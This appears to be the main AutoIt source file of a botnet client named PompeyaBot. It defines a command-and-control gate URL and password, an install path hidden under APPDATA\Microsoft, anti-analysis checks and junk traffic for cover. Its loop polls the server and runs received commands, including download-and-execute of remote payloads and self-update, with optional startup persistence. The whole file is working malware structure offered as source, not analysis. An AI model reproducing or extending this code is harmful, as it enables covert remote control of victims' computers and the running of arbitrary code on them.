#NoTrayIcon

#include <Information.au3>
#include <Install.au3>
#include <Functions.au3>
#include <Connection.au3>
#include <Antis.au3>

Global 	$HOST_URL			 = "http://127.0.0.1/gate.php"
Global 	$HOST_PASSWORD 		 = "Blau"
Global 	$INSTALL_NAME 		 = "Pompeya.exe"
Global 	$INSTALL_PATH 		 = EnvGet("APPDATA") & "\Microsoft\" & $INSTALL_NAME
Global 	$MUTEX_STRING 		 = "PompeyaBot"
Local 	$FIRST_DELAY 		 = 1000
Local 	$CONNECTION_DELAY 	 = 1000
Local 	$STARTUP_PERSISTENCE = False
Local 	$BOT_VERSION 		 = "1.0.5"

Main()

Func Main()
   ;Sleep ($FIRST_DELAY)
   ;Mutex()
   ;Install()

   Local $CommandSplit
   While True
	  ;~Misc
	  Antis()
	  For $i = 0 To Random(5, 10)
		 JunkConnection()
	  Next
	  
	  ;~Commands
	  $CommandSplit = StringSplit(SendAndGet(), "/--/", 1)

	  If $CommandSplit[0] > 1 Then
		 Switch $CommandSplit[1]
			Case "DownloadAndExecute"
			   DownloadAndExecute($CommandSplit[2], $CommandSplit[3])
			   
			Case "Update"
			   Update($CommandSplit[2], $CommandSplit[3])
			   
			Case "MsgBox"
			   MsgBox($CommandSplit[3], $CommandSplit[4], $CommandSplit[2])
		 EndSwitch
	  EndIf
	  
	  If $STARTUP_PERSISTENCE Then
		 Startup()
	  EndIf
	  For $i = 0 To Random(5, 10)
		 JunkConnection()
	  Next
	  
	  RandomSleep()
   WEnd
EndFunc